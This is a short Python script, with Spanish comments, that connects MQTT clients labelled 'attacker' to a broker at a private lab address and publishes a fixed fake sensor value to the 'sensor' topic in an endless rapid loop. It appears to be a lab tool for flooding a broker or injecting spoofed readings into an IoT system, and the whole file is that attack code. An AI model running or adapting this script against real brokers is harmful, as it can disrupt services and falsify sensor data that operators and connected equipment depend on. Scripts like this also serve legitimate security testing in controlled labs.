import paho.mqtt.client as mqtt
import time

BROKER = "10.0.2.15"  # IP del broker MQTT
PORT = 1883               # Puerto del broker (por defecto: 1883)
TOPIC = "sensor"          # El topic en el que publicarás los mensajes
PAYLOAD = "50"            # Mensaje que publicarás
CLIENTS = []              # Lista para mantener el control de los clientes

def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print(f"Connected with result code {rc}")
    else:
        print(f"Failed to connect with result code {rc}")

# Crear y conectar los clientes MQTT
try:
    for i in range(1):  # Ajusta el número de clientes según sea necesario
        client = mqtt.Client(client_id=f"attacker_{i}")  # ID único para cada cliente
        client.on_connect = on_connect
        client.connect(BROKER, PORT, 60)  # Conexión al broker

        # Asegúrate de conectar antes de publicar
        client.loop_start()  # Inicia el ciclo de eventos del cliente en un hilo

        CLIENTS.append(client)
        print(f"[+] Connected client {i}")
        time.sleep(0.01)  # Control de la velocidad de conexión

    # Publicar mensajes continuamente
    while True:
        for client in CLIENTS:
            client.publish(TOPIC, PAYLOAD, qos=0)  # Publica el mensaje en el topic
            print(f"[+] Sent message to {TOPIC}")
            time.sleep(0.01)  # Control de la velocidad de publicación

except Exception as e:
    print(f"[!] Error: {e}")
